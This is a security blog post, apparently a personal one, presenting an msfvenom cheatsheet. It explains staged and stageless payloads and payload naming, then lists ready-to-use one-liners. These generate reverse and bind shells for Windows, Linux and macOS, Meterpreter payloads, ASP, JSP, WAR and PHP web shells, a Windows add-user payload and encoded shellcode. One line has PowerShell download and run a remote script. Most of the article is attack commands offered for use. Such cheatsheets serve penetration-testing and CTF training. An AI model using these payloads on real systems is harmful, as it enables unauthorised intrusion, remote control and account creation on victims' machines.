<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="kafka ">
<meta name="description" content="The standard syntax for msfvenom is as follows:
msfvenom -p &amp;lt;PAYLOAD&amp;gt; &amp;lt;OPTIONS&amp;gt;
For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&amp;lt;listen-IP&amp;gt; LPORT=&amp;lt;listen-port&amp;gt;
Staged vs Stageless There are two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.
  Staged payloads are sent in two parts. The first part is called the stager." />
<meta name="keywords" content=", msfvenom, payloads" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://kafkaesc.com/posts/2022/08/msfvenom-cheatsheet/" />


    <title>
        
            msfvenom Cheatsheet :: [KafkaEsc] 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://kafkaesc.com/main.bc572f86409bdb93797dcfcce944ae54be23cb6dca8696ed32b935e0e1d748d8.css">



    <link rel="apple-touch-icon" sizes="180x180" href="https://kafkaesc.com/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://kafkaesc.com/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://kafkaesc.com/favicon-16x16.png">
    <link rel="manifest" href="https://kafkaesc.com/site.webmanifest">
    <link rel="mask-icon" href="https://kafkaesc.com/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="https://kafkaesc.com/favicon.ico">
    <meta name="msapplication-TileColor" content="">
    <meta name="theme-color" content="">



<meta itemprop="name" content="msfvenom Cheatsheet">
<meta itemprop="description" content="The standard syntax for msfvenom is as follows:
msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;
For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;
Staged vs Stageless There are two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.
  Staged payloads are sent in two parts. The first part is called the stager.">
<meta itemprop="datePublished" content="2022-08-30T00:00:00+00:00" />
<meta itemprop="dateModified" content="2022-08-30T00:00:00+00:00" />
<meta itemprop="wordCount" content="693">
<meta itemprop="image" content="https://kafkaesc.com"/>



<meta itemprop="keywords" content="msfvenom,payloads," />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://kafkaesc.com"/>

<meta name="twitter:title" content="msfvenom Cheatsheet"/>
<meta name="twitter:description" content="The standard syntax for msfvenom is as follows:
msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;
For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;
Staged vs Stageless There are two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.
  Staged payloads are sent in two parts. The first part is called the stager."/>




    <meta property="og:title" content="msfvenom Cheatsheet" />
<meta property="og:description" content="The standard syntax for msfvenom is as follows:
msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;
For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;
Staged vs Stageless There are two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.
  Staged payloads are sent in two parts. The first part is called the stager." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://kafkaesc.com/posts/2022/08/msfvenom-cheatsheet/" />
<meta property="og:image" content="https://kafkaesc.com"/>
<meta property="article:published_time" content="2022-08-30T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-08-30T00:00:00+00:00" />




    <meta property="article:section" content="cheatsheets" />



    <meta property="article:published_time" content="2022-08-30 00:00:00 &#43;0000 UTC" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://kafkaesc.com/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark"> </span>
            <span class="logo__text">/home/KafkaEsc</span>
            <span class="logo__cursor" style=
                  "visibility:hidden;
                   background-color:#67a2c9;
                   animation-duration:3s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner">
                <li><a href="https://kafkaesc.com/about/">About</a></li>
                <li><a href="https://kafkaesc.com/posts/">Posts</a></li>
                <div class="submenu">
                    <li class="dropdown">
                        <a href="https://kafkaesc.com/categories/" class="dropbtn">Resources</a>
                        <label class="drop-icon" for="Resources">▾</label>
                        <div class="dropdown-content">
                                
                                    <a title="Write Ups" href="https://kafkaesc.com/categories/write-ups/">Write Ups</a>
                                
                                    <a title="Tutorials" href="https://kafkaesc.com/categories/tutorials/">Tutorials</a>
                                
                                    <a title="Cheatsheets" href="https://kafkaesc.com/categories/cheatsheets/">Cheatsheets</a>
                                
                        </div>
                    </li>
                </div>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        4 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://kafkaesc.com/posts/2022/08/msfvenom-cheatsheet/">msfvenom Cheatsheet</a>
      </h1>

      

      

      

      <div class="post-content">
        <p>The standard syntax for msfvenom is as follows:</p>
<p><code>msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</code></p>
<p>For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:</p>
<p><code>msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;</code></p>
<h2 id="staged-vs-stageless">Staged vs Stageless</h2>
<p>There are two concepts which must be introduced: <em><strong>staged</strong></em> reverse shell payloads and <em><strong>stageless</strong></em> reverse shell payloads.</p>
<ul>
<li>
<p><em><strong>Staged</strong></em> payloads are sent in two parts. The first part is called the <em>stager</em>. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn&rsquo;t actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts &ndash; a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener &ndash; usually the Metasploit multi/handler, which will be covered in the next task.</p>
</li>
<li>
<p><em><strong>Stageless</strong></em> payloads are a simple binary file. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.</p>
</li>
</ul>
<h2 id="payload-naming-conventions">Payload Naming Conventions</h2>
<p>The basic convention is as follows:</p>
<p><code>&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</code></p>
<p>For example:</p>
<p><code>linux/x86/shell_reverse_tcp</code></p>
<p>This would generate a stageless reverse shell for an x86 Linux target.</p>
<p>The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:</p>
<p><code>windows/shell_reverse_tcp   </code></p>
<p>For a 64bit Windows target, the arch would be specified as normal (x64).</p>
<p>In the above examples the payload used was <code>shell_reverse_tcp</code>. This indicates that it was a <em>stageless</em> payload. Stageless payloads are denoted with underscores (<code>_</code>). The staged equivalent to this payload would be:</p>
<p><code>shell/reverse_tcp</code></p>
<p>As staged payloads are denoted with another forward slash (<code>/</code>).</p>
<p>This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:</p>
<p><code>windows/x64/meterpreter/reverse_tcp</code></p>
<p>A Linux 32bit stageless Meterpreter payload would look like this:</p>
<p><code>linux/x86/meterpreter_reverse_tcp</code></p>
<h2 id="payloads">Payloads</h2>
<table>
<thead>
<tr>
<th>MSFVenom Payload Generation One-Liner</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>msfvenom -l   payloads</td>
<td>List available payloads</td>
</tr>
<tr>
<td>msfvenom -p PAYLOAD &ndash;list-options</td>
<td>List payload options</td>
</tr>
<tr>
<td>msfvenom -p   PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT   LHOST=IP</td>
<td>Payload Encoding</td>
</tr>
<tr>
<td>msfvenom -p   linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf  &gt;  shell.elf</td>
<td>Linux Meterpreter  reverse shell x86 multi stage</td>
</tr>
<tr>
<td>msfvenom -p   linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf  &gt;  shell.elf</td>
<td>Linux Meterpreter  bind shell x86 multi stage</td>
</tr>
<tr>
<td>msfvenom -p linux/x64/shell_bind_tcp   RHOST=IP LPORT=PORT -f elf &gt; shell.elf</td>
<td>Linux bind shell x64 single stage</td>
</tr>
<tr>
<td>msfvenom -p linux/x64/shell_reverse_tcp   RHOST=IP LPORT=PORT -f elf &gt; shell.elf</td>
<td>Linux reverse shell x64 single stage</td>
</tr>
<tr>
<td>msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe &gt;   shell.exe</td>
<td>Windows Meterpreter reverse shell</td>
</tr>
<tr>
<td>msfvenom -p   windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent=&ldquo;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&rdquo; -f exe &gt; shell.exe</td>
<td>Windows Meterpreter http reverse shell</td>
</tr>
<tr>
<td>msfvenom -p   windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe &gt;   shell.exe</td>
<td>Windows Meterpreter bind shell</td>
</tr>
<tr>
<td>msfvenom -p   windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe &gt;   shell.exe</td>
<td>Windows CMD Multi Stage</td>
</tr>
<tr>
<td>msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT   -f exe &gt;  shell.exe</td>
<td>Windows CMD Single Stage</td>
</tr>
<tr>
<td>msfvenom -p   windows/adduser USER=hacker PASS=password -f exe &gt; useradd.exe</td>
<td>Windows add user</td>
</tr>
<tr>
<td>msfvenom -p   osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho &gt;   shell.macho</td>
<td>Mac Reverse Shell</td>
</tr>
<tr>
<td>msfvenom -p   osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho  &gt;  shell.macho</td>
<td>Mac Bind shell</td>
</tr>
<tr>
<td>msfvenom -p   cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw &gt;   shell.py</td>
<td>Python Shell</td>
</tr>
<tr>
<td>msfvenom -p   cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw &gt;   shell.sh</td>
<td>BASH Shell</td>
</tr>
<tr>
<td>msfvenom -p   cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw &gt;   shell.pl</td>
<td>PERL Shell</td>
</tr>
<tr>
<td>msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp &gt;   shell.asp</td>
<td>ASP Meterpreter shell</td>
</tr>
<tr>
<td>msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw  &gt;  shell.jsp</td>
<td>JSP Shell</td>
</tr>
<tr>
<td>msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war &gt;   shell.war</td>
<td>WAR Shell</td>
</tr>
<tr>
<td>msfvenom -p   php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw  &gt;  shell.php   cat shell.php</td>
<td>pbcopy &amp;&amp; echo &lsquo;?php '</td>
</tr>
<tr>
<td>msfvenom -p   php/reverse_php LHOST=IP LPORT=PORT -f raw  &gt;  phpreverseshell.php</td>
<td>Php Reverse Shell</td>
</tr>
<tr>
<td>msfvenom -a x86   &ndash;platform Windows -p windows/exec CMD=&ldquo;powershell \&ldquo;IEX(New-Object   Net.webClient).downloadString(&lsquo;http://IP/nishang.ps1&rsquo;)&quot;&rdquo;   -f python</td>
<td>Windows Exec Nishang Powershell in   python</td>
</tr>
<tr>
<td>msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/shikata_ga_nai -b &ldquo;\x04\xA0&rdquo;</td>
<td>Bad characters shikata_ga_nai</td>
</tr>
<tr>
<td>msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/fnstenv_mov -b &ldquo;\x04\xA0&rdquo;</td>
<td>Bad characters fnstenv_mov</td>
</tr>
</tbody>
</table>

      </div>
    </article>

    

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://kafkaesc.com/tags/msfvenom/">msfvenom</a></span>
        <span class="tag"><a href="https://kafkaesc.com/tags/payloads/">payloads</a></span>
        
    </p>

      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://kafkaesc.com/categories/cheatsheets/">cheatsheets</a></span>
        
    </p>


      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        693 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2022-08-30 01:00
        

         
          
        
      </p>
    </div>

    

    
    <div class="pagination">
        <div class="pagination__title">
            <span class="pagination__title-h"></span>
            <hr />
        </div>

        <div class="pagination__buttons">
            

            
            <span class="button next">
                <a href="https://kafkaesc.com/posts/2022/08/decteting-and-enumerating-sqli/">
                    <span class="button__text">Decteting and Enumerating SQLi</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            
        </div>
    </div>



    

    

  </main>

            </div>

            
                <footer class="footer">
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>V2UncmUgYWxsIG1hZCBoZXJlLgo=</span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://kafkaesc.com/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>



    </body>
</html>
